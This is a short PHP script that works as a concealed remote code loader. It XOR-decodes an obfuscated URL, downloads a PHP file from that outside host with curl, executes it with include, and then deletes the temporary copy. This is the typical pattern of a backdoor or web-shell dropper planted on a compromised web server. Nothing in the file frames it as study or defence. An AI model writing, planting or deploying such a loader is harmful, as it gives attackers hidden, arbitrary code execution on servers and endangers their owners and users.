<?php
set_time_limit(0);

function xorEncryptDecrypt($data, $key) {
    $output = '';
    foreach (str_split($data) as $char) {
        $output .= chr(ord($char) ^ ord($key));
    }
    return $output;
}
$_ = "!";
$url = xorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
$path = xorEncryptDecrypt("xTB@DSHORHLQMDBLE@OEC@BJENNSSDGRID@ERL@HOBOQIQ", $_);

$tempFile = sys_get_temp_dir() . '/downloaded_file.php';  // File sementara

$ch = curl_init("https://$url$path");
$fp = fopen($tempFile, 'wb');

curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_HEADER, 0);

$success = curl_exec($ch);
if ($success === false) {
    echo "Curl error: " . curl_error($ch);
    exit;}
curl_close($ch);
fclose($fp);

if (filesize($tempFile) > 0) {
    include $tempFile;
} else {
    echo "";
}
unlink($tempFile);
?>
